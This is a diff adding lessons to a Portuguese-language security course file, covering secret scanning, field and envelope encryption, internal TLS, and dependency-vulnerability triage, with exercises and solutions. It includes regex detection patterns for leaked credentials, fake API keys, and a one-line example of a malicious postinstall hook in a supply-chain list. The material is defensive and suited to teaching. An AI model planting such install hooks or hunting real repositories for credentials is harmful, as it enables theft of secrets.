+                  "// Uma versão mínima do que ferramentas como gitleaks e trufflehog fazem",
+                  "const PATTERNS = [",
+                  "  { name: \"chave AWS\", regex: /\\bAKIA[0-9A-Z]{16}\\b/ },",
+                  "  { name: \"chave privada\", regex: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },",
+                  "  { name: \"chave de pagamento (live)\", regex: /\\bsk_live_[0-9a-zA-Z]{20,}\\b/ },",
+                  "  { name: \"atribuição suspeita\", regex: /(password|secret|api_key)\\s*[:=]\\s*[\"'][^\"']{12,}[\"']/i },",
+                  "];",
+                  "",
+                  "const scan = (text) => PATTERNS.filter((p) => p.regex.test(text)).map((p) => p.name);",
+                  "",
+                  "scan('const client = new Payments({ apiKey: \"sk_live_51HcA2bC3dE4fG5hI6jK7\" });');   // [\"chave de pagamento (live)\"]",
+                  "scan(\"const timeoutMs = 5000;\");                                                     // []",
+                ].join("\n"),
+              },
+              explanation:
+                "Rodar a varredura num hook de pre-commit impede o segredo de entrar no histórico, e rodá-la no CI pega " +
+                "quem pulou o hook. Os provedores de repositório também fazem varredura e, em parceria com alguns " +
+                "emissores de chaves, revogam automaticamente as encontradas.",
+            },
+          ],
+          exercise: {
+            problem:
+              "O serviço de notificações tem a chave do provedor de SMS escrita no código, e ela aparece inteira nos " +
+              "logs de erro sempre que uma chamada falha. O repositório é compartilhado com uma agência externa.",
+            problemCode: {
+              language: "javascript",
+              filename: "sms.js",
+              code: [
+                "const SMS_API_KEY = \"sms_live_9f8e7d6c5b4a39281706f5e4d3c2b1a0\";",
+                "",
+                "async function sendSms(to, text, { fetch, log }) {",
+                "  const request = { url: \"https://api.sms.test/send\", headers: { authorization: `Key ${SMS_API_KEY}` }, body: { to, text } };",
+                "  const res = await fetch(request);",
+                "  if (!res.ok) log.error(\"falha ao enviar SMS\", request);   // o log inclui o cabeçalho com a chave",
+                "  return res.ok;",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Tire a chave do código (lida do ambiente, com falha clara se faltar), mascare segredos no log e escreva " +
+              "a lista de passos para lidar com a chave que já está no histórico.",
+            hint:
+              "Passe a configuração como parâmetro, redija o objeto antes de logar e lembre que a chave antiga precisa " +
+              "ser revogada.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "sms.fixed.js",
+                code: [
+                  "function loadSmsConfig(env) {",
+                  "  if (!env.SMS_API_KEY) throw new Error(\"SMS_API_KEY não configurada\");",
+                  "  return { apiKey: env.SMS_API_KEY };",
+                  "}",
+                  "",
+                  "const SECRET = /authorization|api[_-]?key|secret|token/i;",
+                  "const redact = (obj) => JSON.parse(JSON.stringify(obj, (k, v) => (SECRET.test(k) && typeof v === \"string\" ? \"***\" : v)));",
+                  "",
+                  "async function sendSms(to, text, { fetch, log, config }) {",
+                  "  const request = { url: \"https://api.sms.test/send\", headers: { authorization: `Key ${config.apiKey}` }, body: { to, text } };",
+                  "  const res = await fetch(request);",
+                  "  if (!res.ok) log.error(\"falha ao enviar SMS\", redact(request));",
+                  "  return res.ok;",
+                  "}",
+                  "",
+                  "const logged = [];",
+                  "await sendSms(\"+5581999990000\", \"Seu código: 123456\", {",
+                  "  fetch: async () => ({ ok: false }),",
+                  "  log: { error: (msg, data) => logged.push(data) },",
+                  "  config: loadSmsConfig({ SMS_API_KEY: \"sms_live_nova\" }),",
+                  "});",
+                  "logged[0].headers.authorization;   // \"***\"",
+                  "",
+                  "// Passos para a chave que já está no histórico:",
+                  "// 1. revogar sms_live_9f8e... no painel do provedor e gerar uma nova (a agência já teve acesso)",
+                  "// 2. conferir nos logs do provedor se houve uso fora do esperado",
+                  "// 3. guardar a nova no cofre de segredos; nunca no repositório",
+                  "// 4. ligar a varredura de segredos no pre-commit e no CI",
+                ].join("\n"),
+              },
+              explanation:
+                "A chave passou a vir de fora e não aparece mais em logs. O passo mais importante, porém, é o primeiro da " +
+                "lista: a chave antiga está no histórico de um repositório compartilhado com terceiros e deve ser tratada " +
+                "como pública, qualquer que seja a limpeza feita no código.",
+            },
+          },
         }),
         concept({
           order: 130,
@@ -21776,8 +24407,485 @@ export default area({
           subtopics: ["at rest (disco/DB/campo, KMS, envelope)", "in transit — revisita TLS"],
           note: "consolidada (B4)",
           revisit: ["Platform / Web Fundamentals / TLS"],
+          summary:
+            "Proteger os dados com criptografia enquanto viajam pela rede (em trânsito, com TLS, inclusive entre " +
+            "serviços internos) e enquanto estão guardados (em repouso: discos, bancos, backups e campos sensíveis), " +
+            "com as chaves guardadas separadas dos dados.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Criptografia em trânsito protege os dados enquanto passam pela rede: TLS em tudo, também entre os " +
+                "serviços internos, e não só na borda. Criptografia em repouso protege os dados armazenados, em camadas: " +
+                "o disco inteiro (protege contra o roubo da mídia), o banco ou o serviço de armazenamento (em geral uma " +
+                "opção do provedor) e campos específicos, cifrados pela própria aplicação (protegem até de quem tem " +
+                "acesso ao banco). O ponto decisivo é a chave: criptografar com uma chave guardada ao lado dos dados não " +
+                "protege nada. Por isso se usa um serviço de gerência de chaves (KMS) e a criptografia envelope: cada " +
+                "dado é cifrado com uma chave própria, e essa chave é cifrada pela chave mestra, que nunca sai do KMS.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Criptografia é tão boa quanto a guarda da chave: use algoritmos padrão com autenticação (como " +
+                "AES-256-GCM), nunca reutilize o IV com a mesma chave, e mantenha as chaves num KMS, separadas dos dados " +
+                "que elas protegem.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "field-encryption.js",
+              code: [
+                "import { randomBytes, createCipheriv, createDecipheriv } from \"node:crypto\";",
+                "",
+                "// AES-256-GCM: confidencialidade + integridade (a tag detecta qualquer alteração)",
+                "function encrypt(plaintext, key) {",
+                "  const iv = randomBytes(12);   // novo a cada cifragem: nunca reutilize com a mesma chave",
+                "  const cipher = createCipheriv(\"aes-256-gcm\", key, iv);",
+                "  const data = Buffer.concat([cipher.update(plaintext, \"utf8\"), cipher.final()]);",
+                "  return [iv, cipher.getAuthTag(), data].map((b) => b.toString(\"base64\")).join(\".\");",
+                "}",
+                "",
+                "function decrypt(payload, key) {",
+                "  const [iv, tag, data] = payload.split(\".\").map((part) => Buffer.from(part, \"base64\"));",
+                "  const decipher = createDecipheriv(\"aes-256-gcm\", key, iv);",
+                "  decipher.setAuthTag(tag);",
+                "  return Buffer.concat([decipher.update(data), decipher.final()]).toString(\"utf8\");   // falha se algo foi alterado",
+                "}",
+                "",
+                "const key = randomBytes(32);   // em produção, vem do KMS (envelope), nunca de uma constante",
+                "const stored = encrypt(\"123.456.789-09\", key);",
+                "decrypt(stored, key);   // \"123.456.789-09\"",
+                "encrypt(\"123.456.789-09\", key) === stored;   // false — IV diferente a cada vez",
+                "",
+                "const [iv, tag, data] = stored.split(\".\");",
+                "const tampered = [iv, tag, Buffer.from(\"xxxxxxxxxxxxxx\").toString(\"base64\")].join(\".\");",
+                "try { decrypt(tampered, key); } catch (error) { error.message; }   // \"Unsupported state or unable to authenticate data\"",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "O modo GCM autentica o dado cifrado: uma alteração, por menor que seja, faz a decifragem falhar, em vez " +
+                "de devolver um texto adulterado. O IV (nonce) de 12 bytes aleatórios precisa ser único para cada " +
+                "cifragem com a mesma chave; repeti-lo compromete a segurança de todos os dados cifrados com ela.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "TLS em toda comunicação, inclusive entre serviços dentro da mesma rede e com o banco de dados, com verificação de certificado ligada.",
+                "Criptografia em repouso do provedor (disco, banco, armazenamento de objetos, backups) sempre, porque é barata e cobre roubo de mídia e de snapshots.",
+                "Criptografia de campo pela aplicação para dados muito sensíveis (documentos, dados de saúde, dados bancários), que nem quem administra o banco deveria ler.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "A criptografia do disco e do banco não protege contra quem acessa pela aplicação ou pelo banco com credenciais válidas: para eles, os dados aparecem decifrados.",
+                "Campos cifrados não podem ser buscados nem ordenados pelo banco; buscas exatas exigem um índice à parte, como um HMAC do valor.",
+                "Algoritmos e modos próprios, ou antigos (DES, ECB, MD5, SHA-1 para assinatura), não oferecem proteção real; use as construções padrão das bibliotecas.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Criptografia envelope",
+              context: "Cada dado tem a sua chave, e só a chave pequena passa pelo KMS.",
+              code: {
+                language: "javascript",
+                filename: "envelope.js",
+                code: [
+                  "import { randomBytes, createCipheriv, createDecipheriv } from \"node:crypto\";",
+                  "",
+                  "// KMS simulado: guarda a chave mestra e só cifra/decifra chaves pequenas, nunca a entrega",
+                  "const kms = (() => {",
+                  "  const masterKey = randomBytes(32);",
+                  "  const seal = (buf) => { const iv = randomBytes(12); const c = createCipheriv(\"aes-256-gcm\", masterKey, iv); const d = Buffer.concat([c.update(buf), c.final()]); return Buffer.concat([iv, c.getAuthTag(), d]); };",
+                  "  const open = (buf) => { const d = createDecipheriv(\"aes-256-gcm\", masterKey, buf.subarray(0, 12)); d.setAuthTag(buf.subarray(12, 28)); return Buffer.concat([d.update(buf.subarray(28)), d.final()]); };",
+                  "  return { encryptDataKey: seal, decryptDataKey: open };",
+                  "})();",
+                  "",
+                  "function encryptDocument(plaintext) {",
+                  "  const dataKey = randomBytes(32);                              // chave só deste documento",
+                  "  const iv = randomBytes(12);",
+                  "  const cipher = createCipheriv(\"aes-256-gcm\", dataKey, iv);",
+                  "  const data = Buffer.concat([cipher.update(plaintext), cipher.final()]);",
+                  "  return { encryptedKey: kms.encryptDataKey(dataKey), iv, tag: cipher.getAuthTag(), data };   // a chave vai cifrada, junto",
+                  "}",
+                  "",
+                  "function decryptDocument(doc) {",
+                  "  const dataKey = kms.decryptDataKey(doc.encryptedKey);        // única chamada ao KMS",
+                  "  const decipher = createDecipheriv(\"aes-256-gcm\", dataKey, doc.iv);",
+                  "  decipher.setAuthTag(doc.tag);",
+                  "  return Buffer.concat([decipher.update(doc.data), decipher.final()]).toString();",
+                  "}",
+                  "",
+                  "decryptDocument(encryptDocument(\"laudo médico confidencial\"));   // \"laudo médico confidencial\"",
+                ].join("\n"),
+              },
+              explanation:
+                "Os dados grandes são cifrados localmente, rápido, e só a chave de 32 bytes vai ao KMS. Trocar a chave " +
+                "mestra exige recifrar apenas as chaves de dados, e não os dados. Quem copiar o banco leva dados e chaves " +
+                "cifradas, mas nenhuma chave que as abra.",
+            },
+            {
+              title: "TLS também dentro da rede",
+              context: "\"É rede interna\" não é motivo para tráfego em texto puro.",
+              code: {
+                language: "javascript",
+                filename: "internal-tls.js",
+                code: [
+                  "import pg from \"pg\";",
+                  "import { readFileSync } from \"node:fs\";",
+                  "",
+                  "// Conexão com o banco com TLS e verificação do certificado do servidor",
+                  "const pool = new pg.Pool({",
+                  "  connectionString: process.env.DATABASE_URL,",
+                  "  ssl: {",
+                  "    ca: readFileSync(\"/etc/ssl/certs/db-ca.pem\", \"utf8\"),   // confia na CA que emitiu o certificado do banco",
+                  "    rejectUnauthorized: true,                               // nunca false em produção",
+                  "  },",
+                  "});",
+                  "",
+                  "// Entre serviços, uma malha de serviços (service mesh) ou mTLS faz o mesmo de forma automática,",
+                  "// e ainda autentica quem está do outro lado.",
+                ].join("\n"),
+              },
+              explanation:
+                "Redes internas têm máquinas comprometidas, tráfego espelhado para monitoramento e ligações entre nuvens " +
+                "que passam pela internet. TLS com verificação do certificado protege contra quem escuta e contra quem se " +
+                "passa pelo banco; `rejectUnauthorized: false` mantém a criptografia e perde a segunda proteção.",
+            },
+            {
+              title: "Buscar por um campo cifrado",
+              context: "O banco não consegue comparar valores cifrados com IV aleatório.",
+              code: {
+                language: "javascript",
+                filename: "blind-index.js",
+                code: [
+                  "import { createHmac } from \"node:crypto\";",
+                  "",
+                  "// Ao lado do CPF cifrado (AES-GCM), guarda-se um HMAC do valor normalizado, com outra chave",
+                  "const INDEX_KEY = Buffer.alloc(32, 7);   // no exemplo; em produção, do KMS, separada da de cifragem",
+                  "const blindIndex = (cpf) => createHmac(\"sha256\", INDEX_KEY).update(cpf.replace(/\\D/g, \"\")).digest(\"hex\");",
+                  "",
+                  "// Gravação: { cpf_encrypted: encrypt(cpf), cpf_index: blindIndex(cpf) }",
+                  "// Busca exata: WHERE cpf_index = ?",
+                  "blindIndex(\"123.456.789-09\") === blindIndex(\"12345678909\");   // true — o mesmo valor, a mesma entrada no índice",
+                  "blindIndex(\"123.456.789-09\") === blindIndex(\"123.456.789-10\"); // false",
+                ].join("\n"),
+              },
+              explanation:
+                "O HMAC é determinístico e permite a busca exata, mas não revela o CPF a quem não tem a chave do índice. " +
+                "Ele não permite buscas por parte do valor nem ordenação, e dados com poucos valores possíveis ficam mais " +
+                "expostos a tentativas; é uma troca consciente entre busca e sigilo.",
+            },
+          ],
+          exercise: {
+            problem:
+              "Um sistema de RH guarda os dados bancários dos funcionários (banco, agência e conta) em texto no banco. " +
+              "A auditoria exigiu que só a aplicação consiga lê-los, nem mesmo quem administra o banco.",
+            problemCode: {
+              language: "javascript",
+              filename: "bank-details.js",
+              code: [
+                "const employees = new Map();   // simula a tabela",
+                "",
+                "function saveBankDetails(employeeId, details) {",
+                "  employees.set(employeeId, { bankDetails: JSON.stringify(details) });   // em texto",
+                "}",
+                "",
+                "function getBankDetails(employeeId) {",
+                "  return JSON.parse(employees.get(employeeId).bankDetails);",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Cifre os dados bancários com AES-256-GCM antes de gravar e decifre ao ler, com a chave vinda de fora " +
+              "(parâmetro). Mostre que o valor gravado não contém o número da conta e que uma alteração no valor " +
+              "gravado é detectada.",
+            hint:
+              "Guarde `iv.tag.dados` em Base64 e use um IV novo a cada gravação. A decifragem com GCM lança um erro se " +
+              "a tag não conferir.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "bank-details.fixed.js",
+                code: [
+                  "import { randomBytes, createCipheriv, createDecipheriv } from \"node:crypto\";",
+                  "",
+                  "function encrypt(plaintext, key) {",
+                  "  const iv = randomBytes(12);",
+                  "  const cipher = createCipheriv(\"aes-256-gcm\", key, iv);",
+                  "  const data = Buffer.concat([cipher.update(plaintext, \"utf8\"), cipher.final()]);",
+                  "  return [iv, cipher.getAuthTag(), data].map((b) => b.toString(\"base64\")).join(\".\");",
+                  "}",
+                  "",
+                  "function decrypt(payload, key) {",
+                  "  const [iv, tag, data] = payload.split(\".\").map((p) => Buffer.from(p, \"base64\"));",
+                  "  const decipher = createDecipheriv(\"aes-256-gcm\", key, iv);",
+                  "  decipher.setAuthTag(tag);",
+                  "  return Buffer.concat([decipher.update(data), decipher.final()]).toString(\"utf8\");",
+                  "}",
+                  "",
+                  "function saveBankDetails(employeeId, details, key) {",
+                  "  employees.set(employeeId, { bankDetails: encrypt(JSON.stringify(details), key) });",
+                  "}",
+                  "",
+                  "function getBankDetails(employeeId, key) {",
+                  "  return JSON.parse(decrypt(employees.get(employeeId).bankDetails, key));",
+                  "}",
+                  "",
+                  "const key = randomBytes(32);   // em produção: chave de dados do KMS",
+                  "saveBankDetails(7, { bank: \"001\", branch: \"1234\", account: \"98765-4\" }, key);",
+                  "employees.get(7).bankDetails.includes(\"98765\");   // false — o banco guarda só texto cifrado",
+                  "getBankDetails(7, key).account;                    // \"98765-4\"",
+                  "",
+                  "const [iv, tag, data] = employees.get(7).bankDetails.split(\".\");",
+                  "const flipped = Buffer.from(data, \"base64\"); flipped[0] ^= 1;",
+                  "employees.get(7).bankDetails = [iv, tag, flipped.toString(\"base64\")].join(\".\");",
+                  "let detected = false;",
+                  "try { getBankDetails(7, key); } catch { detected = true; }",
+                  "detected;   // true — a alteração foi detectada, e nenhum dado adulterado foi devolvido",
+                ].join("\n"),
+              },
+              explanation:
+                "Quem lê a tabela vê só texto cifrado; a chave fica com a aplicação (e, em produção, no KMS), fora do " +
+                "alcance de quem administra o banco. O GCM também garante a integridade: um único bit alterado no valor " +
+                "gravado faz a leitura falhar, em vez de devolver dados bancários adulterados.",
+            },
+          },
         }),
-        concept({ order: 140, title: "Dependency Vulnerabilities", subtopics: ["SCA", "CVE/CVSS", "dependências transitivas", "auditoria de lockfile", "supply chain (menção)"], note: "mantida aqui (D6 alterada)" }),
+        concept({
+          order: 140,
+          title: "Dependency Vulnerabilities",
+          subtopics: ["SCA", "CVE/CVSS", "dependências transitivas", "auditoria de lockfile", "supply chain (menção)"],
+          note: "mantida aqui (D6 alterada)",
+          summary:
+            "Falhas de segurança conhecidas nas bibliotecas de que o sistema depende — inclusive nas dependências das " +
+            "dependências —, identificadas por CVEs, medidas pelo CVSS e encontradas por ferramentas de análise de " +
+            "composição (SCA) que comparam o lockfile com bases de vulnerabilidades.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "A maior parte do código de uma aplicação moderna vem de bibliotecas de terceiros, e cada uma pode ter " +
+                "vulnerabilidades. Quando uma é descoberta e publicada, ela ganha um identificador CVE e uma nota de " +
+                "gravidade (CVSS, de 0 a 10), e entra em bases públicas, como a do GitHub e a OSV. As ferramentas de " +
+                "análise de composição de software (SCA) — `npm audit`, Dependabot, Snyk, `osv-scanner` — leem o " +
+                "lockfile, que registra a versão exata de cada pacote instalado, inclusive as dependências transitivas, e " +
+                "apontam as que estão em faixas vulneráveis. A gravidade da nota é só o começo: o que importa é se o " +
+                "código vulnerável é alcançável no seu uso.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Você é responsável por todo o código que roda, inclusive o das dependências transitivas: audite o " +
+                "lockfile automaticamente, atualize com frequência pequena e priorize as vulnerabilidades pela gravidade " +
+                "e pela exposição real, e não só pela nota.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "audit.js",
+              code: [
+                "// Uma auditoria mínima: versões do lockfile × faixas vulneráveis de um aviso de segurança",
+                "const lockfile = {",
+                "  \"node_modules/express\": { version: \"4.19.2\" },",
+                "  \"node_modules/body-parser\": { version: \"1.20.2\" },              // dependência de express (transitiva)",
+                "  \"node_modules/path-to-regexp\": { version: \"0.1.7\" },            // dependência de express (transitiva)",
+                "  \"node_modules/lodash\": { version: \"4.17.21\" },",
+                "};",
+                "",
+                "const advisories = [",
+                "  { package: \"path-to-regexp\", vulnerable: { from: \"0.0.0\", before: \"0.1.10\" }, id: \"CVE-2024-45296\", severity: \"high\" },",
+                "  { package: \"lodash\", vulnerable: { from: \"0.0.0\", before: \"4.17.21\" }, id: \"CVE-2021-23337\", severity: \"high\" },",
+                "];",
+                "",
+                "const parse = (v) => v.split(\".\").map(Number);",
+                "const lessThan = (a, b) => { const [x, y] = [parse(a), parse(b)]; for (let i = 0; i < 3; i++) if (x[i] !== y[i]) return x[i] < y[i]; return false; };",
+                "",
+                "const findings = Object.entries(lockfile).flatMap(([path, { version }]) => {",
+                "  const name = path.replace(\"node_modules/\", \"\");",
+                "  return advisories",
+                "    .filter((a) => a.package === name && !lessThan(version, a.vulnerable.from) && lessThan(version, a.vulnerable.before))",
+                "    .map((a) => ({ name, version, id: a.id, severity: a.severity, fixIn: a.vulnerable.before }));",
+                "});",
+                "",
+                "findings;",
+                "// [{ name: \"path-to-regexp\", version: \"0.1.7\", id: \"CVE-2024-45296\", severity: \"high\", fixIn: \"0.1.10\" }]",
+                "// lodash 4.17.21 já tem a correção — não aparece",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A dependência vulnerável não está no `package.json` do projeto: ela veio com o Express. É por isso que a " +
+                "auditoria olha o lockfile, onde está a árvore inteira. As ferramentas reais fazem o mesmo, com bases " +
+                "atualizadas e com a comparação de versões semânticas completa.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Auditoria automática no CI, em todo pull request, e agendada, porque vulnerabilidades novas aparecem em versões que não mudaram.",
+                "Atualizações automáticas em lotes pequenos (Dependabot, Renovate), com testes, para que corrigir uma vulnerabilidade não exija pular várias versões de uma vez.",
+                "Um inventário (SBOM) do que roda em produção, para responder rápido \"estamos afetados?\" quando uma vulnerabilidade grande é anunciada.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "As ferramentas só conhecem vulnerabilidades já publicadas; uma biblioteca abandonada ou maliciosa pode não ter nenhum aviso.",
+                "Tratar toda nota alta como urgente gera fadiga de alertas; uma falha num parser que o sistema nunca usa com entrada externa pode esperar mais do que uma média na borda.",
+                "Auditar não protege a cadeia de suprimentos: pacotes com nome parecido (typosquatting), versões publicadas por contas invadidas e scripts de instalação exigem outras defesas.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Ler um aviso: CVE, CVSS e faixa afetada",
+              context: "O essencial de um aviso de segurança cabe em poucas linhas.",
+              code: {
+                language: "text",
+                filename: "advisory.txt",
+                code: [
+                  "CVE-2021-23337 — lodash: injeção de comandos em _.template",
+                  "  Afetado:     < 4.17.21",
+                  "  Corrigido:   4.17.21",
+                  "  CVSS 3.1:    7.2 (alta) — AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+                  "               ↑ rede, baixa complexidade, MAS exige privilégios altos (PR:H)",
+                  "",
+                  "Perguntas para priorizar:",
+                  "  1. A versão instalada está na faixa? (o lockfile responde)",
+                  "  2. O código usa _.template? Com texto vindo de fora?",
+                  "  3. Existe versão corrigida compatível? (4.17.21: patch, sem quebra)",
+                ].join("\n"),
+              },
+              explanation:
+                "O vetor do CVSS conta a história por trás da nota: por onde o ataque chega, se precisa de login, o que " +
+                "ele compromete. Ler o vetor e conferir se a função afetada é usada decide a urgência melhor do que o " +
+                "número sozinho.",
+            },
+            {
+              title: "Corrigir uma transitiva sem esperar o pacote pai",
+              context: "A correção existe, mas a dependência direta ainda não atualizou a sua faixa.",
+              code: {
+                language: "text",
+                filename: "overrides.json",
+                code: [
+                  "{",
+                  "  \"dependencies\": {",
+                  "    \"express\": \"^4.19.2\"",
+                  "  },",
+                  "  \"overrides\": {",
+                  "    \"path-to-regexp@<0.1.10\": \"0.1.12\"",
+                  "  }",
+                  "}",
+                  "",
+                  "npm install      → o lockfile passa a ter path-to-regexp 0.1.12 dentro de express",
+                  "npm ls path-to-regexp",
+                  "npm audit        → o aviso some",
+                  "",
+                  "Registrar o motivo e remover o override quando o express publicar a versão com a correção.",
+                ].join("\n"),
+              },
+              explanation:
+                "`overrides` (npm) e `resolutions` (Yarn) forçam uma versão de uma dependência transitiva. É uma correção " +
+                "temporária: o pacote pai pode não ter sido testado com a versão forçada, e por isso ela deve ter motivo " +
+                "registrado e data para sair.",
+            },
+            {
+              title: "Cadeia de suprimentos: o pacote que não é o que parece",
+              context: "Nem todo risco vem de um bug publicado com CVE.",
+              code: {
+                language: "text",
+                filename: "supply-chain.txt",
+                code: [
+                  "Typosquatting      \"expresss\", \"lodahs\", \"cross-env\" × \"crossenv\" — nomes parecidos com código malicioso",
+                  "Conta invadida     uma versão nova de um pacote popular publicada por quem roubou a conta do mantenedor",
+                  "Script de instalação  \"postinstall\": \"node collect.js\" — roda na máquina de quem instala e no CI",
+                  "",
+                  "Defesas comuns:",
+                  "  - revisar o nome e o histórico antes de adicionar uma dependência nova",
+                  "  - npm ci com lockfile (instala exatamente o que foi revisado)",
+                  "  - desligar scripts de instalação onde não são necessários (npm config set ignore-scripts true)",
+                  "  - atrasar a adoção de versões recém-publicadas (políticas de \"idade mínima\")",
+                  "  - verificar a procedência dos pacotes (npm audit signatures, provenance)",
+                ].join("\n"),
+              },
+              explanation:
+                "Os ataques à cadeia de suprimentos não esperam um CVE: o código malicioso é a própria versão publicada. " +
+                "Instalação a partir do lockfile, cuidado com dependências novas e restrição a scripts de instalação " +
+                "reduzem a janela em que um pacote comprometido chega ao sistema.",
+            },
+          ],
+          exercise: {
+            problem:
+              "O time recebeu 40 alertas de dependências de uma vez e não sabe por onde começar. Um recorte com cinco " +
+              "deles está abaixo, com o que se sabe sobre o uso de cada pacote.",
+            problemCode: {
+              language: "javascript",
+              filename: "triage.js",
+              code: [
+                "const alerts = [",
+                "  { pkg: \"xml-parser\", cvss: 9.8, direct: true, reachable: \"parseia uploads de clientes\", fixAvailable: \"patch\" },",
+                "  { pkg: \"dev-server\", cvss: 9.1, direct: true, reachable: \"só em desenvolvimento, nunca em produção\", fixAvailable: \"major\" },",
+                "  { pkg: \"img-resize\", cvss: 7.5, direct: false, reachable: \"redimensiona fotos enviadas por usuários\", fixAvailable: \"minor\" },",
+                "  { pkg: \"date-utils\", cvss: 5.3, direct: false, reachable: \"função afetada não é usada\", fixAvailable: \"patch\" },",
+                "  { pkg: \"logger\", cvss: 6.1, direct: true, reachable: \"formata mensagens com dados de requisições\", fixAvailable: \"none\" },",
+                "];",
+              ].join("\n"),
+            },
+            task:
+              "Ordene os alertas pela prioridade real, combinando a nota com a exposição, e diga a ação para cada um. " +
+              "Explique por que o de nota 9.1 não é o primeiro.",
+            hint:
+              "Um alerta de código alcançável por entrada externa em produção vem antes de uma nota alta num pacote que " +
+              "só roda em desenvolvimento. Sem correção disponível, a ação é mitigar.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "triage.answer.js",
+                code: [
+                  "const exposure = (a) => (/nunca em produção|não é usada/.test(a.reachable) ? 0 : /clientes|usuários|requisições/.test(a.reachable) ? 2 : 1);",
+                  "",
+                  "const plan = alerts",
+                  "  .map((a) => ({ ...a, priority: a.cvss * exposure(a) }))",
+                  "  .sort((a, b) => b.priority - a.priority)",
+                  "  .map((a) => ({",
+                  "    pkg: a.pkg,",
+                  "    priority: a.priority,",
+                  "    action:",
+                  "      a.fixAvailable === \"none\" ? \"mitigar: não passar dados de requisições direto ao formatador; acompanhar a correção\" :",
+                  "      a.priority === 0 ? `baixo: atualizar (${a.fixAvailable}) no ciclo normal` :",
+                  "      `atualizar agora (${a.fixAvailable})`,",
+                  "  }));",
+                  "",
+                  "plan.map((p) => `${p.priority.toFixed(1)} ${p.pkg}: ${p.action}`);",
+                  "// [\"19.6 xml-parser: atualizar agora (patch)\",",
+                  "//  \"15.0 img-resize: atualizar agora (minor)\",",
+                  "//  \"12.2 logger: mitigar: não passar dados de requisições direto ao formatador; acompanhar a correção\",",
+                  "//  \"0.0 dev-server: baixo: atualizar (major) no ciclo normal\",",
+                  "//  \"0.0 date-utils: baixo: atualizar (patch) no ciclo normal\"]",
+                ].join("\n"),
+              },
+              explanation:
+                "O `dev-server` tem nota 9.1, mas não roda em produção nem recebe entrada de atacantes; o `xml-parser` e " +
+                "o `img-resize` processam o que clientes enviam, em produção. Priorizar pela exposição real concentra o " +
+                "esforço onde o risco existe, e os alertas de baixa prioridade seguem para o ciclo normal de atualização, " +
+                "sem serem esquecidos.",
+            },
+          },
+        }),
       ],
     }),
     module({
